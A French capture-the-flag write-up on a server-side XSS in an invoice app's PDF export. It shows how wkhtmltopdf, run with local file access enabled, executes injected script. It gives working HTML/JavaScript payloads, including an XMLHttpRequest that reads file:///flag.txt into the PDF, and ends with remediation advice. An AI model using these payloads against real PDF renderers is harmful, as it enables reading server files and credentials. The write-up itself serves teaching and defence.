# Proformat — XSS côté serveur dans l'export PDF

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/proformat/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — L'aperçu web de Proformat échappe bien le HTML, mais l'export PDF ne
> l'échappe pas : `wkhtmltopdf` interprète mon HTML et mon JavaScript côté serveur.
> Comme il tourne avec `--enable-local-file-access`, j'injecte un script qui lit
> `file:///flag.txt` et l'écrit dans le PDF. **Flag :** `NCTF{…}`.

## 1. Deux chemins de rendu

Je remplis le formulaire de facture (captcha requis) et je note :

- l'**aperçu web** échappe tout le HTML saisi (pas de XSS dans le navigateur) ;
- un bouton exporte en **PDF**.

## 2. Injection dans le PDF

Dans le champ « Notes / conditions » je mets :

```html
<b>test</b>
```

L'aperçu web montre les balises en clair (échappement Jinja2), mais le **PDF**
affiche le texte en gras — le HTML est interprété par le moteur de rendu
(`wkhtmltopdf`, basé sur QtWebKit).

## 3. Confirmer l'exécution de JS

```html
<script>document.write('XSS');</script>
```

Le PDF affiche « XSS » : le JavaScript s'exécute côté serveur pendant la
génération.

## 4. Lire le flag

`wkhtmltopdf` est lancé avec `--enable-local-file-access`, donc j'ai accès au
système de fichiers. J'injecte :

```html
<script>
var x = new XMLHttpRequest();
x.open('GET', 'file:///flag.txt', false);
x.send();
document.write('<pre>' + x.responseText + '</pre>');
</script>
```

J'exporte en PDF : le flag apparaît dans le document.

## 5. Flag

```text
NCTF{…}
```

## 6. Leçons & remédiation

- **Échapper le HTML sur tous les chemins de rendu**, pas seulement l'aperçu web.
  Un moteur PDF qui exécute du JS est une surface d'attaque à part entière.
- **Désactiver `--enable-local-file-access`** et l'exécution de JavaScript dans le
  moteur PDF ; rendre depuis un gabarit figé, jamais du HTML utilisateur brut.
